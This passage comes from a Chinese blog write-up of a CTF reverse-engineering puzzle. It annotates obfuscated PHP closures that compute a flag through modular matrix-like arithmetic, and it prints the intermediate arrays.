class="line">        <span class="keyword">return</span> <span class="variable">$lIlIll1111</span>(<span class="variable">$f2</span>(<span class="variable">$II1IIl1Ill</span>))(<span class="variable">$ret_self</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$f4</span> = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$II1IlllI11</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$ll1IlllIIl</span></span>) <span class="keyword">use</span>(<span class="params"><span class="variable">$II1IlllI11</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$II1IlllI11</span>(<span class="variable">$ll1IlllIIl</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 模1000000007自增</span></span><br><span class="line"><span class="variable">$increase_mod</span> = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$lII1lI1IlI</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$lII1lI1IlI</span> + <span class="number">1</span>) % <span class="number">1000000007</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// array(8)</span></span><br><span class="line"><span class="variable">$v1</span> = <span class="keyword">array</span>(<span class="keyword">array</span>(<span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))(<span class="variable">$f4</span>))))(<span class="variable">$f4</span>)))(<span class="variable">$f4</span>), <span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f1</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>)))), <span class="variable">$f1</span>(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>)))(<span class="variable">$f4</span>))))(<span class="variable">$f4</span>))(<span class="variable">$f4</span>)), <span class="variable">$f3</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))(<span class="variable">$f1</span>(<span class="variable">$f4</span>)), <span class="variable">$ret_self</span>, <span class="variable">$f3</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f1</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>)))), <span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f3</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))(<span class="variable">$f1</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))))), <span class="variable">$f1</span>(<span class="variable">$f1</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>)))), <span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))), <span class="keyword">array</span>(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>)))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>)))(<span class="variable">$f4</span>))), <span class="variable">$ret_self</span>, <span class="variable">$f1</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>)), <span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f3</span>(<span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))(<span class="variable">$f4</span>))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>)))(<span class="variable">$f4</span>))(<span class="variable">$f4</span>), <span class="variable">$ret_self</span>, <span class="variable">$f1</span>(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))(<span class="variable">$f1</span>(<span class="variable">$f4</span>))), <span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f1</span>(<span class="variable">$f4</span>)))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>)))(<span class="variable">$f4</span>))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f1</span>(<span class="variable">$f4</span>))), <span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>)))(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>)))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))), <span class="variable">$f3</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f1</span>(<span class="variable">$f4</span>))))), <span class="keyword">array</span>(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))(<span class="variable">$f4</span>), <span class="variable">$f1</span>(<span class="variable">$f4</span>), <span class="variable">$ret_self</span>, <span class="variable">$f1</span>(<span class="variable">$f2</span>(<span class="variable">$f3</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))))(<span class="variable">$f4</span>)), <span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>), <span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))))(<span class="variable">$f4</span>)), <span class="variable">$ret_self</span>, <span class="variable">$f4</span>, <span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f1</span>(<span class="variable">$f4</span>)))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))))(<span class="variable">$f1</span>(<span class="variable">$f4</span>)))), <span class="keyword">array</span>(<span class="variable">$f1</span>(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>)))(<span class="variable">$f1</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))), <span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))(<span class="variable">$f4</span>)))(<span class="variable">$f1</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))), <span class="variable">$f1</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>)), <span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>), <span class="variable">$f4</span>, <span class="variable">$ret_self</span>, <span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f3</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))), <span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f3</span>(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))(<span class="variable">$f4</span>))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>)), <span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>)))(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))(<span class="variable">$f4</span>))(<span class="variable">$f4</span>)))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))), <span class="keyword">array</span>(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))(<span class="variable">$f4</span>))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>)))), <span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f1</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f1</span>(<span class="variable">$f4</span>)))))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f1</span>(<span class="variable">$f4</span>))), <span class="variable">$f3</span>(<span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))(<span class="variable">$f4</span>))(<span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))(<span class="variable">$f4</span>)), <span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))), <span class="variable">$ret_self</span>, <span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))(<span class="variable">$f4</span>), <span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f1</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))))(<span class="variable">$f4</span>), <span class="variable">$f4</span>, <span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>)))), <span class="keyword">array</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>), <span class="variable">$f1</span>(<span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))(<span class="variable">$f3</span>(<span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))(<span class="variable">$f4</span>))(<span class="variable">$f1</span>(<span class="variable">$f4</span>)))), <span class="variable">$f1</span>(<span class="variable">$f4</span>), <span class="variable">$ret_self</span>, <span class="variable">$f2</span>(<span class="variable">$f3</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))(<span class="variable">$f1</span>(<span class="variable">$f4</span>)))(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))(<span class="variable">$f4</span>))), <span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))(<span class="variable">$f1</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f1</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))))), <span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))(<span class="variable">$f4</span>))(<span class="variable">$f4</span>))(<span class="variable">$f4</span>), <span class="variable">$ret_self</span>, <span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f1</span>(<span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f1</span>(<span class="variable">$f4</span>))))(<span class="variable">$f4</span>))))(<span class="variable">$f4</span>)), <span class="keyword">array</span>(<span class="variable">$ret_self</span>, <span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>)), <span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>)))(<span class="variable">$f3</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))), <span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f1</span>(<span class="variable">$f4</span>))), <span class="variable">$ret_self</span>, <span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))(<span class="variable">$f4</span>))(<span class="variable">$f1</span>(<span class="variable">$f3</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>)))))(<span class="variable">$f4</span>), <span class="variable">$ret_self</span>, <span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))(<span class="variable">$f1</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>)))))(<span class="variable">$f4</span>))(<span class="variable">$f4</span>), <span class="variable">$f1</span>(<span class="variable">$f4</span>)), <span class="keyword">array</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>), <span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f1</span>(<span class="variable">$f4</span>))))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>)))), <span class="variable">$f4</span>, <span class="variable">$f2</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))(<span class="variable">$f4</span>), <span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>)), <span class="variable">$f3</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))(<span class="variable">$f4</span>))), <span class="variable">$ret_self</span>, <span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>)))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>)))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>)), <span class="variable">$f3</span>(<span class="variable">$f1</span>(<span class="variable">$f4</span>))(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4</span>))))));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印初始变量</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$i</span> . <span class="string">&#x27;: [&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$f4_2</span> = <span class="variable">$f4</span>; <span class="variable">$f4_2</span>(<span class="variable">$increase</span>)(-<span class="number">9</span>); <span class="variable">$f4_2</span> = <span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4_2</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$v1[$i][$f4_2($decrease)(9)]($increase_mod)(0)&#125;</span>,&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$v1[$i][$f4_2($decrease)(9)]($increase_mod)(0)&#125;</span>]&quot;</span>, <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$v1</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$f4_2</span> = <span class="variable">$ret_self</span>; <span class="variable">$f4_2</span>(<span class="variable">$increase</span>)(<span class="number">998244353</span>) &lt; <span class="variable">$f4_2</span>(<span class="variable">$decrease</span>)(<span class="number">6755399441055744</span>); <span class="variable">$f4_2</span> = <span class="variable">$f1</span>(<span class="variable">$f4_2</span>)) &#123;</span><br><span class="line">    <span class="comment">// $v3 = 3 ** k % 7</span></span><br><span class="line">    <span class="variable">$v3</span> = <span class="variable">$v1</span>[<span class="variable">$f4_2</span>(<span class="variable">$mul_mod</span>)(<span class="number">1</span>)];</span><br><span class="line">    <span class="comment">// $v4 其实是无用的</span></span><br><span class="line">    <span class="comment">// $v4 = $v1[$f3($f4_2)($f4_2)($mul_mod)(1)];</span></span><br><span class="line">    <span class="variable">$v4</span> = <span class="keyword">array</span>(<span class="number">9</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">0</span>] = <span class="variable">$f3</span>(<span class="variable">$v2</span>[<span class="number">0</span>])(<span class="variable">$v3</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">0</span>] = <span class="variable">$f2</span>(<span class="variable">$f3</span>(<span class="variable">$v3</span>[<span class="number">3</span>])(<span class="variable">$v2</span>[<span class="number">1</span>]))(<span class="variable">$v4</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">0</span>] = <span class="variable">$f2</span>(<span class="variable">$f3</span>(<span class="variable">$v2</span>[<span class="number">2</span>])(<span class="variable">$v3</span>[<span class="number">6</span>]))(<span class="variable">$v4</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">1</span>] = <span class="variable">$f3</span>(<span class="variable">$v2</span>[<span class="number">1</span>])(<span class="variable">$v3</span>[<span class="number">4</span>]);</span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">1</span>] = <span class="variable">$f2</span>(<span class="variable">$f3</span>(<span class="variable">$v3</span>[<span class="number">1</span>])(<span class="variable">$v2</span>[<span class="number">0</span>]))(<span class="variable">$v4</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">1</span>] = <span class="variable">$f2</span>(<span class="variable">$v4</span>[<span class="number">1</span>])(<span class="variable">$f3</span>(<span class="variable">$v3</span>[<span class="number">7</span>])(<span class="variable">$v2</span>[<span class="number">2</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">2</span>] = <span class="variable">$f3</span>(<span class="variable">$v2</span>[<span class="number">1</span>])(<span class="variable">$v3</span>[<span class="number">5</span>]);</span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">2</span>] = <span class="variable">$f2</span>(<span class="variable">$f3</span>(<span class="variable">$v2</span>[<span class="number">0</span>])(<span class="variable">$v3</span>[<span class="number">2</span>]))(<span class="variable">$v4</span>[<span class="number">2</span>]);</span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">2</span>] = <span class="variable">$f2</span>(<span class="variable">$f3</span>(<span class="variable">$v2</span>[<span class="number">2</span>])(<span class="variable">$v3</span>[<span class="number">8</span>]))(<span class="variable">$v4</span>[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">3</span>] = <span class="variable">$f3</span>(<span class="variable">$v2</span>[<span class="number">4</span>])(<span class="variable">$v3</span>[<span class="number">3</span>]);</span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">3</span>] = <span class="variable">$f2</span>(<span class="variable">$v4</span>[<span class="number">3</span>])(<span class="variable">$f3</span>(<span class="variable">$v3</span>[<span class="number">0</span>])(<span class="variable">$v2</span>[<span class="number">3</span>]));</span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">3</span>] = <span class="variable">$f2</span>(<span class="variable">$v4</span>[<span class="number">3</span>])(<span class="variable">$f3</span>(<span class="variable">$v2</span>[<span class="number">5</span>])(<span class="variable">$v3</span>[<span class="number">6</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">4</span>] = <span class="variable">$f3</span>(<span class="variable">$v2</span>[<span class="number">4</span>])(<span class="variable">$v3</span>[<span class="number">4</span>]);</span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">4</span>] = <span class="variable">$f2</span>(<span class="variable">$f3</span>(<span class="variable">$v2</span>[<span class="number">5</span>])(<span class="variable">$v3</span>[<span class="number">7</span>]))(<span class="variable">$v4</span>[<span class="number">4</span>]);</span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">4</span>] = <span class="variable">$f2</span>(<span class="variable">$f3</span>(<span class="variable">$v3</span>[<span class="number">1</span>])(<span class="variable">$v2</span>[<span class="number">3</span>]))(<span class="variable">$v4</span>[<span class="number">4</span>]);</span><br><span class="line">   </span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">5</span>] = <span class="variable">$f3</span>(<span class="variable">$v2</span>[<span class="number">3</span>])(<span class="variable">$v3</span>[<span class="number">2</span>]);</span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">5</span>] = <span class="variable">$f2</span>(<span class="variable">$f3</span>(<span class="variable">$v3</span>[<span class="number">5</span>])(<span class="variable">$v2</span>[<span class="number">4</span>]))(<span class="variable">$v4</span>[<span class="number">5</span>]);</span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">5</span>] = <span class="variable">$f2</span>(<span class="variable">$f3</span>(<span class="variable">$v3</span>[<span class="number">8</span>])(<span class="variable">$v2</span>[<span class="number">5</span>]))(<span class="variable">$v4</span>[<span class="number">5</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">6</span>] = <span class="variable">$f3</span>(<span class="variable">$v2</span>[<span class="number">7</span>])(<span class="variable">$v3</span>[<span class="number">3</span>]);</span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">6</span>] = <span class="variable">$f2</span>(<span class="variable">$f3</span>(<span class="variable">$v3</span>[<span class="number">0</span>])(<span class="variable">$v2</span>[<span class="number">6</span>]))(<span class="variable">$v4</span>[<span class="number">6</span>]);</span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">6</span>] = <span class="variable">$f2</span>(<span class="variable">$v4</span>[<span class="number">6</span>])(<span class="variable">$f3</span>(<span class="variable">$v2</span>[<span class="number">8</span>])(<span class="variable">$v3</span>[<span class="number">6</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">7</span>] = <span class="variable">$f3</span>(<span class="variable">$v2</span>[<span class="number">7</span>])(<span class="variable">$v3</span>[<span class="number">4</span>]);</span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">7</span>] = <span class="variable">$f2</span>(<span class="variable">$f3</span>(<span class="variable">$v3</span>[<span class="number">1</span>])(<span class="variable">$v2</span>[<span class="number">6</span>]))(<span class="variable">$v4</span>[<span class="number">7</span>]);</span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">7</span>] = <span class="variable">$f2</span>(<span class="variable">$f3</span>(<span class="variable">$v2</span>[<span class="number">8</span>])(<span class="variable">$v3</span>[<span class="number">7</span>]))(<span class="variable">$v4</span>[<span class="number">7</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">8</span>] = <span class="variable">$f3</span>(<span class="variable">$v2</span>[<span class="number">8</span>])(<span class="variable">$v3</span>[<span class="number">8</span>]);</span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">8</span>] = <span class="variable">$f2</span>(<span class="variable">$v4</span>[<span class="number">8</span>])(<span class="variable">$f3</span>(<span class="variable">$v2</span>[<span class="number">6</span>])(<span class="variable">$v3</span>[<span class="number">2</span>]));</span><br><span class="line">    <span class="variable">$v4</span>[<span class="number">8</span>] = <span class="variable">$f2</span>(<span class="variable">$f3</span>(<span class="variable">$v2</span>[<span class="number">7</span>])(<span class="variable">$v3</span>[<span class="number">5</span>]))(<span class="variable">$v4</span>[<span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$v4</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 倒序打印 v2</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#123;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$f4_2</span> = <span class="variable">$f4</span>; <span class="variable">$f4_2</span>(<span class="variable">$increase</span>)(-<span class="number">9</span>); <span class="variable">$f4_2</span> = <span class="variable">$f2</span>(<span class="variable">$f4</span>)(<span class="variable">$f4_2</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$v2[$f4_2($decrease)(9)]($increase_mod)(0)&#125;</span>-&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$v2[$f4_2($decrease)(9)]($increase_mod)(0)&#125;</span>&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>基本逻辑都写在注释里面了，代码的重点在如何找到for循环的规律，正所谓<strong>逆向七分解三分猜</strong>，这里其实就是对$v2，$v3的数据进行处理，而且是整整齐齐的三组数据连起来进行计算</p>
<p>我们先把矩阵打印出来看看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: [<span class="number">3</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">8</span>] =&gt; 第一步的<span class="variable">$v2</span></span><br><span class="line"><span class="number">1</span>: [<span class="number">8</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">8</span>] =&gt; 第一步的<span class="variable">$v3</span></span><br><span class="line"><span class="number">2</span>: [<span class="number">9</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line"><span class="number">3</span>: [<span class="number">9</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">9</span>]</span><br><span class="line"><span class="number">4</span>: [<span class="number">5</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">8</span>]</span><br><span class="line"><span class="number">5</span>: [<span class="number">8</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">2</span>]</span><br><span class="line"><span class="number">6</span>: [<span class="number">2</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">0</span>]</span><br><span class="line"><span class="number">7</span>: [<span class="number">8</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">2</span>]</span><br></pre></td></tr></table></figure>

<p>再把经过第一次转换的flag打印出来</p>
